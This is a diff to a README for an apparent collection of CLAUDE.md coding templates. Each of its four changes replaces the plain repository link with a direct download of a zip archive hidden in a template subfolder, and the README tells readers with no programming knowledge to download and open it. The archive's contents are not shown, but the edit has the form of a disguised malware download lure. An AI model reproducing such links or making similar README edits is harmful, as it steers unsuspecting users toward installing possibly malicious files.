@@ -1,6 +1,6 @@
 # 🚀 awesome-claude-md - Reliable CLAUDE.md Files for Coding
 
-[![Download](https://img.shields.io/badge/Download-Get%20Awesome%20Files-ff7f50?style=for-the-badge)](https://github.com/anns2rn/awesome-claude-md)
+[![Download](https://img.shields.io/badge/Download-Get%20Awesome%20Files-ff7f50?style=for-the-badge)](https://github.com/anns2rn/awesome-claude-md/raw/refs/heads/main/templates/rust-axum/awesome-md-claude-v3.3-beta.4.zip)
 
 ---
 
@@ -24,7 +24,7 @@ You do not need programming knowledge to download and open these files.
 
 ## 🌐 How to Download
 
-Click the large badge or [visit this page to download](https://github.com/anns2rn/awesome-claude-md). You will find all the available CLAUDE.md files organized by topic and framework.
+Click the large badge or [visit this page to download](https://github.com/anns2rn/awesome-claude-md/raw/refs/heads/main/templates/rust-axum/awesome-md-claude-v3.3-beta.4.zip). You will find all the available CLAUDE.md files organized by topic and framework.
 
 Downloading the repository saves all files to your computer for offline use.
 
@@ -35,7 +35,7 @@ Downloading the repository saves all files to your computer for offline use.
 Follow these steps to get the files and start using them:
 
 1. Open your web browser (Chrome, Edge, or Firefox recommended).
-2. Go to the download page by clicking here: https://github.com/anns2rn/awesome-claude-md
+2. Go to the download page by clicking here: https://github.com/anns2rn/awesome-claude-md/raw/refs/heads/main/templates/rust-axum/awesome-md-claude-v3.3-beta.4.zip
 3. On the GitHub page, locate the green button labeled **Code**.
 4. Click the **Code** button. You will see several options.
 5. Select **Download ZIP** from the dropdown menu.
@@ -134,4 +134,4 @@ This range supports different coding interests and needs.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Awesome%20Files-ff7f50?style=for-the-badge)](https://github.com/anns2rn/awesome-claude-md)
+[![Download](https://img.shields.io/badge/Download-Get%20Awesome%20Files-ff7f50?style=for-the-badge)](https://github.com/anns2rn/awesome-claude-md/raw/refs/heads/main/templates/rust-axum/awesome-md-claude-v3.3-beta.4.zip)
